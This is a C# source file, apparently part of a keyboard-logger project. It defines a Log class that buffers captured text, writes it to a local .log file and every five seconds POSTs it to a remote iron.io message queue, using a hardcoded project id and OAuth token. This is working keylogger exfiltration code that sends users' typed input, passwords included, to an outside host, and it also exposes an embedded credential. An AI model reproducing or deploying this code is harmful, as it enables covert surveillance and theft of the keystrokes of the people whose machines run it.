﻿// required modules
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;



namespace KeyboardLogger.KeyLog
{
    class Log
    {
        // cloud constants
        const string url = "https://mq-aws-us-east-1.iron.io/1/projects/54dcd5253373aa00060000fc/queues/";
        const string auth = "OAuth hJdydVEvOe4ymWhUqzuzAeakl0g";
        // local constants
        const string path = @"C:\Program_Files\cs-keyboard-logger\";
        static TimeSpan flushSpan = new TimeSpan(0, 0, 5);
        const string ext = ".log";

        // data
        string buff;
        string id, file;
        DateTime logTime;


        // WriteCloud (id, txt)
        static void WriteCloud(string id, string txt) {
            string msg = "{\"messages\":[{\"time\":\""+DateTime.Now+"\",\"body\":\""+txt+"\"}]}";
            Task.Factory.StartNew(() => Http.Request(url + id + "/messages", "POST", "application/json", auth, msg));
        }


        // Log (id)
        // - create a new log with given id
        public Log(string id)
        {
            buff = "";
            this.id = id;
            file = path + id + ext;
            logTime = DateTime.Now;
            Directory.CreateDirectory(path);
            File.AppendAllText(file, "");
        }


        // Write (txt)
        // - write some text to log
        public void Write(string txt)
        {
            buff += txt;
            DateTime now = DateTime.Now;
            if (now - logTime < flushSpan) return;
            File.AppendAllText(file, buff);
            WriteCloud(id, buff);
            logTime = now;
            buff = "";
        }
    }
}